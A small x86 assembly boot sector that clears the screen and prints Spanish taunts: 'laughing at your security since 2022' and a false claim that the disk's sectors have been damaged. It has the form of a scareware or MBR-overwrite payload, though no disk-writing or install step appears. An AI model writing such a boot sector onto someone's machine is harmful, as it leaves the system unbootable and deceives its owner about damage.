BITS    16
ORG     0x7c00
jmp start

start:
        call clear_screen
        mov ax,cs
        mov ds,ax
        mov si, lineauno   
        call print           
print:
        push ax
        cld
next:
        mov al,[si]
        cmp al,0
        je done
        call printchar
        inc si
        jmp next
done:
        jmp $
printchar:
        mov ah,0x0e
        int 0x10
        ret
clear_screen:
        mov ah, 0x07
        mov al, 0x00
        mov bh, 0x0C
        mov cx, 0x1111
        mov dx, 0x184f
        int 0x10
        ret
lineauno: db '      Riendome de tu seguridad desde el 2022',13, 10, 'Ops! los sectores de tu disco 0 han sido dañados',0   
times 510 - ($-$$) db 0
dw        0xaa55